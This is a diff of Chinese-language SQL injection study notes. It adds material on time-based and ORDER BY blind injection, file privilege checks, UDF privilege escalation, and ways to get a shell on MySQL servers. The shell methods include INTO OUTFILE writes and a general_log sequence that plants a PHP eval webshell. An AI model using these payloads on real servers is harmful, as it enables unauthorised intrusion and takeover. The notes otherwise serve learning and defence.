@@ -2,7 +2,7 @@ Title = "SQL注入"
 description = "SQL注入"
 tags = ["Web","Security"]
 publishtime = 2021-07-27T00:15:00
-lastedittime = 2021-08-15T17:03:00
+lastedittime = 2021-08-28T17:03:00
 uuid = "5134c576-2e83-4e1e-9b8f-cb6bd63bdc65"
 -+_+-
 
@@ -38,6 +38,10 @@ uuid = "5134c576-2e83-4e1e-9b8f-cb6bd63bdc65"
 ## 延时注入
 
 延时注入是布尔现象的变形利用，在原本真假值的位置中插入延时语句，通过响应时间来判断真假值。
+
+SLEEP(n) 让mysql延时n秒钟
+
+BENCHMARK(count,expr) 重复count次执行表达式expr
 
 ## 宽字节注入
 
@@ -112,17 +116,23 @@ INSERT INTO TABELNAME(A,B,C) VALUES(A1,B1,C1),(A2,B2,C2);
 SELECT * FROM demo ORDER BY InjectionPoint;
 ```
 
-​	利用`asc`和`desc`关键词可以测试是否为`ORDER BY`注入
+​	 oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假，利用`asc`和`desc`关键词可以测试是否为`ORDER BY`注入
 
-### 情况一：
+### 情况一：判断列数
 
 ```sql
-SELECT * FROM demo ORDER BY 2 UNION SELECT user(),database();
+SELECT * FROM demo ORDER BY 2
 ```
 
-​	`ORDER BY`一般用来快速判断表中的列数量,`Union`无法跟在`ORDER BY`后面，可以搭配 LIMIT 加上PROCEDURE
+​	`ORDER BY`一般用来快速判断表中的列数量，而且根据语法`Union`无法跟在`ORDER BY`后面
 
-### 情况二：order by 盲注（需要知道字段名）
+### 情况二：结合LIMIT PROCEDURE
+
+在使用`ORDER BY`的情况下，`Union`无法跟在`ORDER BY`后面但是可以接LIMIT PROCEDURE或者INTO
+
+
+
+### 情况二：order by 盲注（知道字段名的情况下）
 
 ​	IF 语句返回的是字符类型，不是整型，因此不可以直接使用数字替代，需要知道字段名
 
@@ -163,6 +173,12 @@ SELECT * FROM demo ORDER BY IF(true,id,username)
 	```sql
 	SELECT * FROM demo ORDER BY IF(true,1,sleep(1));
 	```
+
+
+
+注：Order by 后面是不能参数化的，因为一般接的是字段名，如果带字段名那就变成字符串了
+
+
 
 ## Limit注入
 
@@ -260,7 +276,7 @@ SELECT [ALL | DISTINCT | DISTINCTROW ]
 	4. 捕获sql执行异常，避免异常信息的直接回显，使用不被侧信道的自定义异常
 	5. sql执行异常监控并通知
 	6. 使用waf
-	7. 白名单检查
+	7. 白名单检查（只允许合适的参数或函数）
 
 > sql语句传入->检查缓存->规则验证->解析器解析为语法树->预处理器验证语法树->优化sql->生成执行计划->执行
 
@@ -362,6 +378,14 @@ SELECT [ALL | DISTINCT | DISTINCTROW ]
 	```
 
 	
+
+
+
+## 过滤延时函数
+
+如果延时函数无法使用，可以使用重复执行，消耗计算资源的形式来达到延时的效果
+
+
 
 
 
@@ -533,38 +557,120 @@ ERROR 1060 (42S21): Duplicate column name 'username'
 
 
 
+
+
+
+
 ## 文件相关
+
+查询用户读写权限
+
+```
+SELECT file_priv FROM mysql.user WHERE user = 'username';
+```
 
 ### load_file
 
-load_file函数只有满足两个条件就可以使用：
+load_file函数：
 
-> 1、文件权限：chmod a+x pathtofile
+> 1、文件权限：需要有文件读权限，可以查询file_priv
 >
 > 2、文件大小: 必须小于max_allowed_packet 
+>
+> 3、文件绝对路径：需要知道绝对路径
 
-1、必须有权限读取并且文件必须完全可读。
+
+
+### select导出
+
+> 1、绝对路径
+>
+> 2、导出的目录具有可写权限
+>
+> 3、outfile 的文件不可以存在
+
+# 8. 提权
+
+
+
+## udf提权
+
+user defined function，用户自定义函数，通过添加新函数，对mysql的功能进行扩充，利用sql文件写功能和进制转换将dll的binary写入数据库能访问的目录（通常是plugin目录），然后引入该函数执行命令。
+
+ps：一个是受写权限制约，另一个受basedir的制约
+
+
+
+
+
+# 9. Mysql Getshell的几种方式
+
+
+
+sqlmap --os-shell的原理
+
+1. 普通写Webshell
+
+	> 条件：
+	>
+	> 1. 是否有数据导出权限 secure_file_priv
+	> 2. Web目录绝对路径
+	> 3. Web目录的写权限
+
+```sql
+1 union select xxx into outfile  # 联合查询
+1 into outfile  # 无联合查询
+```
+
+如果注入点是盲注或者报错注入，可以利用分隔符写入
 
 ```
-and (select count(*) from mysql.user)>0 /*如果结果返回正常，说明具有读写权限.*/
-and (select count(*) from mysql.user)>0 /* 返回错误，应该是管理员给数据库账户降权了*/
+1 limit 0,1 into outfile '' lines terminated by hex编码 --
 ```
 
-2、欲读取文件必须在服务器上
-
-3、必须指定文件完整的路径
-
-4、欲读取文件必须小于max_allowed_packet
-
-​	如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。
 
 
 
 
+2. 利用log写入
+
+	> 新版本mysql设置了导出文件的路径，很难使用普通select into outfile这种方式写入
+	>
+	> 所以可以利用mysql的log文件来获取webshell
+	>
+	> 条件：
+	>
+	> 1. global general_log 需要为 on     （show variables like '%general%'）
+	> 2. 用户需要Super和File服务器权限
+	> 3. 需要知道绝对路径
+
+```sql
+show variables like ‘%general%’;
+查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。
+
+set global general_log = on;
+开启日志监测，一般是关闭的，如果一直开，文件会很大的。
+
+set global general_log_file = ‘新路径’;
+这里设置我们需要写入的路径就可以了。
+
+select ‘<?php eval($_POST[‘shiyan’]);?>’;
+查询一个一句话，这个时候log日志里就会记录这个。
+
+set global general_log_file = ‘原路径’;
+结束后，再修改为原来的路径。
+
+set global general_log = off;
+关闭下日志记录。
+```
 
 
 
-# 8. 板子
+
+
+2. 
+
+# 9. 板子
 
 
 
